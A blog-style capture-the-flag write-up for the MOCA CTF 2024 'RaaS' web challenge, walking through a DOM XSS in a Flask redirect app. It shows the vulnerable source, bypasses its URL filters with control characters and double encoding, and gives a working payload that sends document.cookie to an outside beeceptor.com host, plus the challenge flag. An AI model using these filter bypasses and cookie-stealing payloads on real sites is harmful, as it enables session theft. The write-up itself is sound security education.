---
layout: post
title: RaaS [WEB] writeup - MOCA CTF 2024 Quals 
author: simonedimaria
category: writeups
chall-category: web
tags: web xss flask
---


# RaaS [WEB] - MOCA CTF 2024 Quals

![[./assets/MocaCTF_logo.png]]

# TL;DR

- The challenge involved achieving DOM XSS inside a Flask template through the `javascript:` pseudo protocol. This was accomplished bypassing a filtering regex and blacklisted characters.
# 0. Description

> A simple click-to-xss to warmup.

---
## 1. Challenge scenario

We're given a form in which it is possible to insert a link, a title, and be redirected to that URL. There is also the possibility of sending this link to the admin who will in turn be redirected.

![[./assets/RaaS_firstlook.png]]

Source code is provided, so we'll look into that to understand what's happening.

## 1.1) Source code analysis

The project is divided into two parts: the main application and the admin bot. We'll look into the application code first.

**app.py**
```python
from flask import Flask, request, render_template, Response, redirect,jsonify, make_response, g, redirect, send_file
import requests
import urllib.parse
import re

app = Flask(__name__)

@app.route('/', methods=['GET'])
def main_page():
    return render_template('home.html')

def check_url(url):
    url = url.lower()
    pattern = r'[()=$`]'
    if bool(re.search(pattern, url, re.IGNORECASE | re.DOTALL)):
        return False
    if url.startswith("j") or "javascript" in url:
        return False
    return True

def check_title(title):
    if "<" in title or ">" in title:
        return False
    return True

@app.route('/redirectTo', methods=['GET'])
def redirect_to():

    url = request.args.get("url")
    title = request.args.get("title")
    default_url = "https://www.youtube.com/watch?v=xvFZjo5PgG0&ab_channel=Duran"

    if not isinstance(title,str) or not isinstance(url,str):
        return render_template('redirect.html',url=default_url, title="title")
    url = url.strip()

    if not check_url(url) or not check_title(title):
        return render_template("redirect.html", title=title, url=default_url)
    return render_template('redirect.html',url=url, title=title)

@app.route('/redirectAdmin', methods=['GET'])
def redirect_admin():
    default_url = "https://www.youtube.com/watch?v=xvFZjo5PgG0&ab_channel=Duran"
    admin_bot = "http://raas-admin:3000/report_to_admin"
    url = request.args.get("url")
    title = request.args.get("title")
    
    if not isinstance(title,str) or not isinstance(url,str):
        requests.post(admin_bot, json={"url":default_url, "title":"title"})
        return jsonify({"message":"done"}), 201

    url = url.strip()
    if not check_url(url) or not check_title(title):
        requests.post(admin_bot, json={"url":default_url, "title":"title"})
        return jsonify({"message":"done"}), 201

    requests.post(admin_bot, json={"url":url, "title":title})
    return jsonify({"message":"done"}), 201


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
```


Clicking on the "*Get Redirected!*" button will trigger the `/redirectTo` route, which is anyway triggered also by the "*Redirect the Admin!*" button that executes the `/redirectAdmin` route.
The first endpoint accepts the `url` and `title` parameters which must be strings and later passed to the `check_url()` and `check_title()` sanitizing functions. If we can bypass that with a working payload, we'll have XSS. 
The second endpoint forwards the given URL to the admin bot, which simply goes to the `/redirectTo` endpoint with our inputs, and simulates a button click on the "*Follow Link*" button.

![[./assets/Raas_redirectTo.png]]

The `check_url` function aims to sanitize the URL input by converting it to lowercase, hence avoiding all the lowercase-uppercase payloads like `jAvAsCriPt:aLeRt(1)`. It also check for the presence of some special characters with the regex ```r'[()=$`]'``` that will limit us later on exploitation.
Particularly, it ensures the URL does not start with "j" character or contain the substring "javascript". This comes out as the main limitation for us, since it should block the payloads with the javascript pseudo protocol.

At this point, a simple way out will be any other working pseudo protocol XSS payload like `data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4`. However, if we try so, the browser will insult us with:

![[./assets/Raas_browserblock.png]]
My approach at this point was to split the checks individually in the source code an try to bypass them one by one.

# 2. Exploitation

Below I will explain how I bypassed each of them, doing it with a bottom-up approach cause I found it more convenient.
## 2.1) "javascript" not allowed bypass

We're not allowed to use the string "javascript" anywhere in our URL, so...just don't use it!
We will write
```
java
script
```
instead.
Here we are using a **newline character** to bypass the check. Since in the Python side `"java\x0Ascript" != "javascript"`, but in the broswer `java%0Ascript` will still be considered a valid url for the `javascript` protocol.

>[!info] NOTE
> Our input get stripped before getting into che sanitizing function, however Python [strip()](https://docs.python.org/3.11/library/stdtypes.html#str.strip) function only removes **leading and trailing characters**.

Even though this is a common bypass, I never actually knew why this was working. Researching for bypasses for the javascript pseudo protocol I've found [this blog](https://aszx87410.github.io/beyond-xss/en/ch1/javascript-protocol/) which was helpful to me to find out the reason why whitespaces are allowed in this situation and find out the bypass for the next filter.
The reason seems to rely in the [URL spec standard](https://url.spec.whatwg.org/) which removes any ASCII tab or newline from inputs.

## 2.2) doesn't starts with "j" bypass

This one was tougher.
the strip function that was allowing me to bypass the previous check was sending me crazy on this one.
Majority of payloads broke the `javascript` protocol: even if they bypassed the checks, they would just get included as part of the web application URL (e.g `url=/java%0Ascript:payload`).
Another example is what I initially thought to be a NULL byte bypass, which caused instead a strange behaviour:
![[./assets/Raas_NULLbyteinurl.png]]
As you can see, it bypassed the python checks but in the button preview (left corner) it was mutated in some non printable character, invalidating it as protocol.
However, i felt in being in the right path, until the previous blog confirmed my sensations.

![[./assets/RaaS_controlcharsinURL.png]]
Control Characters are allowed?? It did, in fact.
Using the **BACKSPACE** (`%08`) character allowed me to bypass the python filter and still getting a valid url for the javascript protocol!
And any of the [ASCII Control Characters](https://en.wikipedia.org/wiki/Control_character) below would have probably get the job done.
![[./assets/Raas_ASCIIcontrolchars.png]]
## 2.3) regex bypass

This was probably the easiest check to bypass, since javascript is very permissive in expressions that can be created even with a few symbols, it is no coincidence that there are many esoteric languages ​​on javascript such as [JSFuck](https://jsfuck.com/) that manage to create valid expressions using only a few symbols.

>[!info] Fun Fact
> [here](http://aem1k.com/aurebesh.js/) I've found some of the funniest javascript esoteric shit expression while doing this challenge, like...how the fuck i can popup alert with fucking Egyptian hieroglyphs, but a simple NULL byte will break the shit out of the payload??

However, searching brainlessly "XSS payloads without parentheses" was enough since i found many working payloads inside [this repo](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md).
I was also able to double encode inside the payload after the `javascript:` since javascript was decoding it.
## 2.4) PoC

```javascript
%08java%0Ascript%3Afetch%2528'http://eeeee.free.beeceptor.com/'%2Bdocument.cookie%2529
// javascript:fetch('http://eeeee.free.beeceptor.com/'+document.cookie)
```

![[./assets/RaaS_finalpayload.png]]
> `PWNX{WH0_D035'N7_l0V3_4_g00D_0l'_W4F?}`

---
### TAGS: #XSS #flask